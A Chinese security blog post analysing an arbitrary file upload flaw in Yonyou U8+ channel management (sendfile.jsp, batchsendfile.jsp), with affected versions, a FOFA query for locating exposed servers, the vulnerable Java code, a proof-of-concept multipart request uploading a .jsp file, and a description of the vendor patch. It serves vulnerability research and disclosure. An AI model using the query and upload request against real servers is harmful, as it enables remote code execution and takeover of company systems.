---
title: "U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-u8-sendfile-upload-rce.html
asset_dir: assets/u8+渠道管理(高级版)-sendfile.jsp、batchsendfile.jsp-文件上传漏洞
---

# U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/4 12:06
* 971浏览
* [0评论](#comment)
* 36分钟阅读

深入探索

SQL

服务器

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

U8+是用友公司推出的企业管理软件套件，广泛应用于财务、供应链、人力资源等多个业务领域。在U8+渠道管理（高级版）模块中，存在一处[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，位于其 `sendfile.jsp` 和 `batchsendfile.jsp` 文件中。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞预警服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

直接看 sendfile.jsp 文件里有关文件处理的实现逻辑（batchsendfile.jsp处理逻辑与sendfile.jsp基本相同）

```
String objectname = "";
String repeatrule = "";
String refrule = "";
String filetype = "";
String flag = "";
String fieldimp = "";
String affix = "";
String fileFullName = "";
if(ServletFileUpload.isMultipartContent(request)){
  ServletFileUpload upload = new ServletFileUpload(new DiskFileItemFactory());
  upload.setHeaderEncoding("UTF-8");
  java.util.List<FileItem> fileItems = upload.parseRequest(request);
  for(FileItem fileItem : fileItems){
    if(fileItem.isFormField()){
      String fieldname = fileItem.getFieldName();
      if("objectname".equals(fieldname)){
        objectname = fileItem.getString("UTF-8");  
      }else if("repeatrule".equals(fieldname)){
        repeatrule = fileItem.getString("UTF-8");
      }else if("refrule".equals(fieldname)){
        refrule = fileItem.getString("UTF-8");
      }else if("filetype".equals(fieldname)){
        filetype = fileItem.getString("UTF-8");
      }else if("flag".equals(fieldname)){
        flag = fileItem.getString("UTF-8");
      }else if("fieldimp".equals(fieldname)){
        fieldimp = fileItem.getString("UTF-8");
      }
    }else{
      affix = fileItem.getName();
      String path = com.gxfcsoft.framework.base.util.PathUtil.getUserFile()+"temp"+java.io.File.separator;
      String fieldID = com.gxfcsoft.framework.base.util.UUID.getID();
      if(affix.indexOf(".")!=-1)
       fieldID +=affix.substring(affix.lastIndexOf("."));
         fileFullName = path+fieldID;
         java.io.File saveFilepath=new java.io.File(fileFullName);
         fileItem.write(saveFilepath);
    }
  }
```

深入探索

恶意软件分析工具

身份验证

VPN服务

预先定义了多个字符串变量并给它们赋了空字符串 `""`作为初始值，然后判断当前收到的 HTTP 请求（`request` 对象，通常是 `HttpServletRequest` 类型）的内容类型（Content-Type）是否为 `multipart/form-data`。如果不是，`if` 内部的所有代码都不会执行。

物流软件安全

`isFormField()` 方法用于区分当前处理的 `fileItem` 是一个普通表单字段（例如 `<input type="text">`、`<input type="hidden">`）还是一个文件上传字段（`<input type="file">`）。如果返回 `true`，则进入 `if` 块处理普通字段；如果返回 `false`，则进入 `else` 块处理文件。

重点看文件处理部分

```
// 9. 处理文件
    }else{
      // 9.1 获取原始文件名
      affix = fileItem.getName();
      // 9.2 构建服务器存储路径
      String path = com.gxfcsoft.framework.base.util.PathUtil.getUserFile()+"temp"+java.io.File.separator;
      // 9.3 生成唯一ID作为新文件名主体
      String fieldID = com.gxfcsoft.framework.base.util.UUID.getID();
      // 9.4 保留原始文件扩展名
          if(affix.indexOf(".")!=-1)
                  fieldID +=affix.substring(affix.lastIndexOf("."));
          // 9.5 拼接成完整的文件路径
                    fileFullName = path+fieldID;
          // 9.6 创建文件对象
                    java.io.File saveFilepath=new java.io.File(fileFullName);
          // 9.7 将文件内容写入磁盘
                    fileItem.write(saveFilepath);
    }
```

首先通过 `fileItem.getName()` 获取用户上传的原始文件名，然后从该文件名中提取文件后缀，并将其与一个新生成的 UUID 拼接，构成新的文件名。最后，将文件保存到服务器上，全程没有对文件后缀和内容进行校验，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

# 漏洞复现

> 两个漏洞逻辑一致，仅仅是路径不一样
>
> 计算机服务器
>
> business/common/lxgzds/batchsendfile.jsp

```
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp"

UPLOAD_TEST
------WebKitFormBoundary--
```

在响应里成功回显上传文件的完整路径，直接访问

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](images/img-001-55891e245e61.webp)](https://image.mrxn.net/bffd9ffbb59448f584b22c9032f88164.webp)

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](images/img-002-ec633a163377.webp)](https://image.mrxn.net/40742b2ddc6c4b9a92a29a8949f510ef.webp)

成功执行我们上传代码

漏洞预警服务

官方补丁修复也很直接，直接正则检测后缀是否为白名单以及是否存在目录穿越等危险字符

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjEyZGRiYjJkNDYyNTI0MTIzNWMxZWFjMWFjYzcwMzZfVU15VGhSb2RQVkp4R1VDWHNRQ2N6ZHhIaWU1Y1ZOSFVfVG9rZW46TjNtdGJBNDE3b3B1UXZ4akRaS2N2emYxbkVjXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjEyZGRiYjJkNDYyNTI0MTIzNWMxZWFjMWFjYzcwMzZfVU15VGhSb2RQVkp4R1VDWHNRQ2N6ZHhIaWU1Y1ZOSFVfVG9rZW46TjNtdGJBNDE3b3B1UXZ4akRaS2N2emYxbkVjXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)

[![U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGVkZWJhMzk1OTY3ODk2YTZjMWMwYjAwNDBhZWFkZWFfNVZIdXFEVUtiQTcyUUNZbHl5VEhyc0dhQWhXUUxaaTdfVG9rZW46UXJZY2JKWGtTbzRrYnF4SDRlQmNvNlZlbkZlXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)](https://kcntosnhx7y5.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGVkZWJhMzk1OTY3ODk2YTZjMWMwYjAwNDBhZWFkZWFfNVZIdXFEVUtiQTcyUUNZbHl5VEhyc0dhQWhXUUxaaTdfVG9rZW46UXJZY2JKWGtTbzRrYnF4SDRlQmNvNlZlbkZlXzE3NTQyMjI1NjQ6MTc1NDIyNjE2NF9WNA)

# 参考

* <https://security.yonyou.com/#/noticeInfo?id=723>
* <https://security.yonyou.com/#/noticeInfo?id=719>

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[U8+渠道管理(高级版) sendfile.jsp、batchsendfile.jsp 文件上传漏洞](https://mrxn.net/jswz/yonyou-u8-sendfile-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-u8-sendfile-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-u8-sendfile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKx0lEQVR4AeyZi3bcug5Ds/v//3xuMOq2aVr2OGmTyV11V1GIIEgpop1Xf729vf33WfzX/tQ+ptSMK/ec8YxrXV1Xr7qa8Yy7x/iMe5/qNVe1z6wzkPe6++9PuYFlIO8TfruKo8PXeuANWHoe1USH4c06qH1cw/DAluMXMHLWdB1GHjC1cK9JYqZFBzYfW3zRK6JdRa1bBlLFe/26G9gNBMb0Yc9Hx4ThrXmfDtjmYMRAtT/W1jyC93+Ax5MIvEfP/x7Vq88YeOxh9+pR+xOG0R/2POu7G8jMdGvfdwPfNhAYT8jsCVTrH7Z6ZT1qxh9lGOc5q4PhOdoLRh44a/Oh3LcN5EOn+ofNf2UgsycImH5uhqEDu2sHHjUweGcoAuw9MDQYXOyPJQwd1u/+PDusORjrR9H7PzBiGPwufdnfvzKQLzvdP9j4awbyD17k3/qQdwPxFZ7xZza1D+xfd3P27bF6GLb1emcc/wzVax5G35rra71dr7GeztXT192beDeQiDdedwPLQGA8KfCc+3Fh1HR9FtenBLZ1MGI9MGJYvwj3nrB6eq73qXkYdX/igdEDqK0fa2DzDQocx4+C3/8sA/kd3/TiG/jlE/IZ9uzWwvoUqOn5DNsjDKN375Oc6DnjWV4Ntn1hxLC+lTA0+52xfT/L9xtydrsvyB0OBMZTASt7Plg1QHnKwONzqU8MjBj2T+DMA8Nvzk1g6LDnKx4YdfadsX16bqarnTGMPWHwzHs4kJn51r7+BpaBwJgaDO5PRWLY5vrx4hE9B9va+GCrwTauPWCeSx9R/Vmrzzj5AEZfGBztCDA88Dm2r+cxrrwMpIo/dP1PHOseyA8b8zKQ/hrBeC3refXANgfbODWw16oOJHwA2Hzhf4jv/7hfZZh73+2Hf2HUVIM91XocHUYdDI4W6L3C8R8BRl9YeRnIUdGtf+8N/IJ1OrB+K+r0Z8fpOWNYe6n1evVwz30khnUvGGvr0zs4iqPDtga2cTx/Ahj9co4OOM7db8if3PoX1O4GAmN6s71g5GCwk9drHFaTowXGlaMHMPrCMcf3DPaG0cd4xr3XZz0w9oLB9oURw8rmZnvtBjIz3dr33cDul4tnWztZGdapw3ytd9bXHIxaPeqVzcHWCyOGPVvfa2H9Wgn7Ohhar+sxDB+s/brHM1TuHuPw/YbkFn4Q7oH8oGHkKLtveyNWwPpawnatz9fR+Ixh2wPW1733gdVrz+4xDh95YPQxH4ahpe4qUncV9oSxD7CUAtMfhGO435Dcwg/CMhAnKsN2iuqV/Tjg2HvFA6Metlz3cm2/GXcPjH7qla2H4TE+Y9h6az8